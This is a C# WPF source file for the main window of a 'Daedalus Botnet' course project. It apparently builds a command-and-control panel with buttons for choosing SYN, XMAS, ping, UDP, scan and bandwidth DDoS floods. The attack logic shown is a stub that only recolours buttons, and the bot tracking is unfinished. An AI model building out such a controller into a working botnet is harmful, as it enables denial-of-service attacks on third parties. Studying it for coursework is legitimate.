using System;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Media;
using Coms4507_Project.BotHandling;
/**
 *  Author: Angus Moore
 *  Project: Coms4507 Daedalus Botnet Project.
 */
namespace Coms4507_Project
{

    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow
    {
        BotHandler botHandler;
        private string ip;
        private string attackType;
        private BrushConverter bc = new BrushConverter();
        public MainWindow()
        {
            InitializeComponent();
            // All custom stuff here.
            Initialise();
            botHandler = new BotHandler(ip);
            attackType = "NONE";
        }


        public void Initialise()
        {
            GetIPAddress();
        }

        private void GetIPAddress()
        {
            string externalIpString = new WebClient().DownloadString("http://icanhazip.com").Replace("\\r\\n", "").Replace("\\n", "").Trim();
            string externalIp = IPAddress.Parse(externalIpString).ToString();
            C2_SERVER_IP.Content = externalIp;
            ip = externalIp;
        }

        private void UpdateOnlineStatus()
        {
            // TODO: Go through each bot and change the text colour to LawnGreen when online.
            //      Currently unsure about how to properly do bindings, but I'm sure there's some nifty
            //      way to do pointer-based stuff, so when the variables update, that's reflected in the program.
            Action<object> updateBots = (object obj) =>
            {
                while(true)
                {
                    // Go through and invoke the dispatcher for update on the colours.
                    foreach (string botName in botHandler.botIpPortDetails.Keys)
                    {
                        // TODO: change the colour if it equals each one. Currently I have no
                        // way of dynamically doing this, but if there is a way I would greatly appreciate it.
                    }
                }
            };
            Task task = new Task(updateBots, "updateBots");
            task.Start();
        }

        private void SYN_FLOOD_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            // SELECT SYN_FLOOD TO THE ATTACK TYPE
            attackType = "SYN_FLOOD";
            SYN_FLOOD.Background = new SolidColorBrush(Colors.Red);
            XMAS_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            PING_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            UDP_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            SCAN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            BANDWIDTH_DDOS.Background = (Brush)bc.ConvertFrom("#0e0e0e");
        }

        private void XMAS_FLOOD_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            attackType = "XMAS_FLOOD";
            XMAS_FLOOD.Background = new SolidColorBrush(Colors.Red);
            SYN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            PING_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            UDP_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            SCAN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            BANDWIDTH_DDOS.Background = (Brush)bc.ConvertFrom("#0e0e0e");
        }

        private void PING_FLOOD_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            attackType = "PING_FLOOD";
            PING_FLOOD.Background = new SolidColorBrush(Colors.Red);
            XMAS_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            SYN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            UDP_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            SCAN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            BANDWIDTH_DDOS.Background = (Brush)bc.ConvertFrom("#0e0e0e");
        }

        private void UDP_FLOOD_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            attackType = "UDP_FLOOD";
            UDP_FLOOD.Background = new SolidColorBrush(Colors.Red);
            XMAS_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            PING_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            SYN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            SCAN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            BANDWIDTH_DDOS.Background = (Brush)bc.ConvertFrom("#0e0e0e");
        }

        private void SCAN_FLOOD_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            attackType = "SCAN_FLOOD";
            SCAN_FLOOD.Background = new SolidColorBrush(Colors.Red);
            XMAS_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            PING_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            UDP_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            SYN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            BANDWIDTH_DDOS.Background = (Brush)bc.ConvertFrom("#0e0e0e");
        }

        private void BANDWIDTH_DDOS_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            attackType = "BANDWIDTH_DDOS";
            BANDWIDTH_DDOS.Background = new SolidColorBrush(Colors.Red);
            XMAS_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            PING_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            UDP_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            SCAN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
            SYN_FLOOD.Background = (Brush)bc.ConvertFrom("#0e0e0e");
        }

        private void ATTACK_BUTTON_Click(object sender, System.Windows.RoutedEventArgs e)
        {
            // THIS IS WHERE WE START THE ATTACK.

            ATTACK_BUTTON.Background = new SolidColorBrush(Colors.Gray);
            ATTACK_BUTTON.Content = "STARTING ATTACK";

            Thread.Sleep(1000);
            ATTACK_BUTTON.Background = new SolidColorBrush(Colors.LawnGreen);
            ATTACK_BUTTON.Content = "STOP ATTACK";
        }

        
    }
}
